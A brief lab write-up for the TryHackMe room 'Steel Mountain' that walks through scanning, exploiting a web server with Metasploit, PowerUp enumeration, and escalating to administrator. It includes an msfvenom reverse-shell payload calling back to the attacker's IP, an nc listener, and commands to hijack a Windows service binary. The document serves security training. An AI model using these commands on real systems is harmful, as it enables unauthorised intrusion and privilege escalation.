# Write up for the tryhackme room: [steelmountain](https://tryhackme.com/room/steelmountain)

export ip=10.10.50.10
export hip=10.18.25.169

# recon and scanning

- `nmap -sC -sV -oN nmap.log $ip`


# process
- tried opening the ip in the browser and we can see the photo of the employee of the month. looking at the source code of the webpage we get the first flag
- from the nmap results, we see there are two webserver ports. but the second flag shows 4 *s in the answer input box, and that gives us the second flag.
- we can open the other webserver using the $ip:port to view the UI
- in the ui we have link to the company behind that webserver. adding that along with the name displayed in the webpage, we get the third flag
- searching this server name in exploit-db will get you the next flag
- using this information is quite easy to do the exploitation. I used metasploit as it is the easiest way.
- in the meterpreter shell, I cd'ed into the desktop of the employee of the month and got the next flag.
- downloading the [powerup](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1) and uploading it next
- next load the powershell in meterpreter
  - `load powershell`
- then convert the current shell to a powershell by entering `powershell_shell`
- then execute the uploaded powerup script by entering below commands
  - `. .\PowerUp.ps1`
  - `Invoke-AllChecks`
- this gets us a service which has the permission to restart services on the system along with a writable application directory
- using msfvenom we can create a reverseshell payload which we can use to gain elevated access to the system.
  - `msfvenom -p windows/shell_reverse_tcp LHOST=10.18.25.169 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o ASCService.exe`
  - in meterpreter type in `shell` and stop the `AdvancedSystemCareService9` service
    - `sc stop AdvancedSystemCareService9`
  - upload this file using meterpreter shell and then move it to the `C:\Program Files (x86)\IObit\Advanced SystemCare\`
  - start nc listener `nc -lnvp 4443`
  - replace the ASCService.exe with the uploaded file and then start the service again using `sc start AdvancedSystemCareService9`
  - doing this will get you administrator privilege in the nc listener you started.
  - going to the administrator's desktop you will get the next flag.